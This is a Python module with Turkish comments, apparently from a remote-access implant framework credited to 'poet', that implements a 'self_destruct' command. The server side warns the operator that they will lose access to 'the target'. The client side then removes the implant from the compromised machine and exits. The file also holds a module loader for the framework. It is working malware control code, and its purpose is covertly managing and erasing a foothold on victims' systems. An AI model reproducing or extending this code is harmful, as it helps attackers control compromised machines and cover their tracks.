#!/usr/bin/env python3
# credit to : poet
import sys
import os
import pkg_resources
from importlib import import_module
import debug

# Modül adı ve kullanım mesajı
MODNAME = 'self_destruct'
USAGE = """Self destruct.
usage: self_destruct [-h]
\nPermanently remove client from target.
\noptions:
-h\t\tshow help"""

# Modül işleyicileri
client_commands = {}
server_commands = {}

def client_handler(cmd):
    """Decorator to be used by modules for declaring client commands."""
    def decorate(func):
        client_commands[cmd] = func
    return decorate

def server_handler(cmd):
    """Decorator to be used by modules for declaring server commands."""
    def decorate(func):
        server_commands[cmd] = func
    return decorate

# Sunucu tarafı işleyici
@server_handler(MODNAME)
def server(server, argv):
    """Server side handler for self-destruct command."""
    if '-h' in argv or '--help' in argv:
        print(USAGE)
    else:
        print("[!] WARNING: You are about to permanently remove the client from the target."
              " You will immediately lose access to the target. Continue? (y/n)")
        if input().lower()[0] == 'y':
            resp = server.conn.exchange(MODNAME)
            if resp == 'boom':
                debug.info('Exiting control shell')
                server.continue_ = False
            else:
                server.info(f'Self-destruct error: {resp}')
        else:
            server.info('Aborting self-destruct')

# İstemci tarafı işleyici
@client_handler(MODNAME)
def client(client, argv):
    """Client side handler for self-destruct command."""
    client.selfdestruct()
    client.s.send('boom')
    sys.exit()

# Modülleri yükleme fonksiyonu
def load_modules():
    """Read the INDEX_FILE and load all modules. Used by client and server."""
    INDEX_FILE = 'modindex.txt'

    # Modül isimlerini almak için INDEX_FILE dosyasını oku
    for fname in pkg_resources.resource_string(__name__, INDEX_FILE).split():
        if fname.endswith('.py'):
            mod = os.path.splitext(fname)[0]

            # __init__ modülü komut değildir, ama doğru çalışması için gereklidir
            if mod == '__init__':
                continue
            elif mod in server_commands:
                raise Exception(f'Duplicate module detected: {mod}')

            import_module('modules.' + mod)
            # TODO: Modül yapısını, gerekli fonksiyonlar için doğrulama

if __name__ == "__main__":
    # Modülleri yükle
    load_modules()

    # Sunucu veya istemci tarafında komutları işleme
    # Bu kısmı projenin geri kalanına göre özelleştirebilirsiniz.
    print(f"{MODNAME} module loaded successfully.")